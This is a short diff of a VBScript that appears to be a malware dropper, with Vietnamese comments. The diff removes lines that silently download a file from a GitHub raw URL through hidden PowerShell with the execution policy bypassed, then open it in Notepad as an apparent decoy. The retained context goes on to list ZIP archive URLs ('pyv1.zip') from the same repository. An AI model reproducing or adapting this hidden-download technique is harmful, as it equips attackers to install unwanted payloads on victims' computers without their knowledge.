@@ -13,15 +13,6 @@ scriptName = fso.GetBaseName(scriptPath)
 tempFolder = shell.ExpandEnvironmentStrings("%TEMP%") & "\"
 txtPath = tempFolder & scriptName & ".txt"
 
-' Tải file txt từ GitHub
-rawUrl = "https://raw.githubusercontent.com/f68g/us/refs/heads/main/content"
-cmd1 = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
-  """(New-Object Net.WebClient).DownloadFile('" & rawUrl & "','" & txtPath & "')"""
-shell.Run cmd1, 0, True
-
-' Mở file txt sau khi tải
-shell.Run "notepad.exe """ & txtPath & """", 1, False
-
 ' URL của các file ZIP
 
 url1 = "https://raw.githubusercontent.com/f68g/us/refs/heads/main/pyv1.zip"
